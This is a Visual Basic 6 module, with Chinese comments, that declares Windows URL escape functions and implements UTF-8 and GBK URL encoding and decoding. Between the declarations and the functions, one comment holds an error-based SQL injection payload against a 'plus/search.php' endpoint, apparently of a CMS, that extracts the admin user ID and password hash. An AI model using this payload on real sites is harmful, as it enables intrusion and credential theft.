Attribute VB_Name = "Module1"
Option Explicit

Public Const MAX_PATH                   As Long = 260
Public Const ERROR_SUCCESS              As Long = 0

'将整个URL参数作为一个URL段
Public Const URL_ESCAPE_SEGMENT_ONLY    As Long = &H2000
Public Const URL_ESCAPE_PERCENT         As Long = &H1000
Public Const URL_UNESCAPE_INPLACE       As Long = &H100000

'路径中包含#
Public Const URL_INTERNAL_PATH          As Long = &H800000
Public Const URL_DONT_ESCAPE_EXTRA_INFO As Long = &H2000000
Public Const URL_ESCAPE_SPACES_ONLY     As Long = &H4000000
Public Const URL_DONT_SIMPLIFY          As Long = &H8000000

'转换不安全字符为相应的退格序列
Public Declare Function UrlEscape Lib "shlwapi" _
                        Alias "UrlEscapeA" _
                        (ByVal pszURL As String, _
                        ByVal pszEscaped As String, _
                        pcchEscaped As Long, _
                        ByVal dwFlags As Long) As Long
'Download by http://www.codefans.net
'转换退格序列为普通的字符
Public Declare Function UrlUnescape Lib "shlwapi" _
                        Alias "UrlUnescapeA" _
                        (ByVal pszURL As String, _
                        ByVal pszUnescaped As String, _
                        pcchUnescaped As Long, _
                        ByVal dwFlags As Long) As Long

'plus/search.php?keyword=11&typeArr[`@'`and(SELECT%201 FROM(select count(*),concat(floor(rand(0)*2),
'(SELECT/*'*/concat(0x5f,userid,0x5f,pwd,0x5f)
' from `%23@__admin` Limit%200,1))a from information_schema.tables group by a)b)]=1

'UTF-8 URL编码

Public Function UTF8_URLEncoding(szInput) As String

    Dim wch, uch, szRet

    Dim x

    Dim nAsc, nAsc2, nAsc3

    If szInput = "" Then

        UTF8_URLEncoding = szInput

        Exit Function

    End If

    For x = 1 To Len(szInput)

        wch = Mid$(szInput, x, 1)

        nAsc = AscW(wch)

        If nAsc < 0 Then nAsc = nAsc + 65536

        If (nAsc And &HFF80) = 0 Then

            szRet = szRet & wch

        Else

            If (nAsc And &HF000) = 0 Then

                uch = "%" & Hex$(((nAsc \ 2 ^ 6)) Or &HC0) & Hex$(nAsc And &H3F Or &H80)

                szRet = szRet & uch

            Else

                uch = "%" & Hex$((nAsc \ 2 ^ 12) Or &HE0) & "%" & _
                      Hex$((nAsc \ 2 ^ 6) And &H3F Or &H80) & "%" & _
                      Hex$(nAsc And &H3F Or &H80)

                szRet = szRet & uch

            End If

        End If

    Next

    UTF8_URLEncoding = szRet

End Function

'GBK URL编码

Public Function URLEncode(ByRef strURL As String) As String

    Dim I As Long

    Dim tempStr As String

    For I = 1 To Len(strURL)

        If Asc(Mid$(strURL, I, 1)) < 0 Then

            tempStr = "%" & Right$(CStr(Hex$(Asc(Mid$(strURL, I, 1)))), 2)

            tempStr = "%" & Left$(CStr(Hex$(Asc(Mid$(strURL, I, 1)))), Len(CStr(Hex$(Asc(Mid$(strURL, I, 1))))) - 2) & tempStr

            URLEncode = URLEncode & tempStr

        ElseIf (Asc(Mid$(strURL, I, 1)) >= 65 And Asc(Mid$(strURL, I, 1)) <= 90) Or (Asc(Mid$(strURL, I, 1)) >= 97 And Asc(Mid$(strURL, I, 1)) <= 122) Then

            URLEncode = URLEncode & Mid$(strURL, I, 1)

        Else

            URLEncode = URLEncode & "%" & Hex$(Asc(Mid$(strURL, I, 1)))

        End If

    Next

End Function

'GBK URL解码

Public Function URLDecode(ByRef strURL As String) As String

    Dim I As Long

    If InStr(strURL, "%") = 0 Then URLDecode = strURL: Exit Function

    For I = 1 To Len(strURL)

        If Mid$(strURL, I, 1) = "%" Then

            If Val("&H" & Mid$(strURL, I + 1, 2)) > 127 Then

                URLDecode = URLDecode & Chr$(Val("&H" & Mid$(strURL, I + 1, 2) & Mid$(strURL, I + 4, 2)))

                I = I + 5

            Else

                URLDecode = URLDecode & Chr$(Val("&H" & Mid$(strURL, I + 1, 2)))

                I = I + 2

            End If

        Else

            URLDecode = URLDecode & Mid$(strURL, I, 1)

        End If

    Next

End Function
